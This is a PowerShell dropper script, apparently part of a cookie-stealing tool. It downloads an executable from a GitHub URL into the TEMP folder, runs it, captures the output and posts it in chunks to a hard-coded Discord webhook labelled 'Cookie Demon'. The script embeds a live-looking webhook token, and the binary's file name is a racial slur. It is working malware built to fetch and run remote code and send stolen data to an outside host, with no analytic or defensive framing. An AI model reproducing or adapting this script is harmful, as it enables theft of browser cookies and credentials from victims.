$webhookUrl = 'https://discordapp.com/api/webhooks/1369454757533454356/B2fwEhJqhY2nuEmIoQNaKFAzfe8VWkjHXzZmXFhKNCblp-xT-CgkoOPL6DEf-N4XXNZo';  # 🔥 Inject yours
$exeUrl = 'https://github.com/aran1910/ddd/raw/refs/heads/main/nigga.exe';  # 🧬 Host compiled Go binary
$exePath = "$env:TEMP\\diper.exe";

# 🧲 Drop the binary if it doesn't exist
if (-not (Test-Path -Path $exePath)) {
    Invoke-WebRequest -Uri $exeUrl -OutFile $exePath;
}

# 🎯 Execute the binary and grab output
$commandOutput = & $exePath | Out-String;

# 🧱 Chunk + Upload to Webhook
$chunks = [Math]::Ceiling($commandOutput.Length / 1900);
for ($i = 0; $i -lt $chunks; $i++) {
    $start = $i * 1900;
    $length = [Math]::Min(1900, $commandOutput.Length - $start);
    $content = $commandOutput.Substring($start, $length);
    $payload = @{
        'username' = '🧬 Cookie Demon';
        'content'  = $content
    }
    $json = $payload | ConvertTo-Json -Compress
    Invoke-RestMethod -Uri $webhookUrl -Method POST -Body $json -ContentType 'application/json'
    Start-Sleep -Milliseconds 600
}
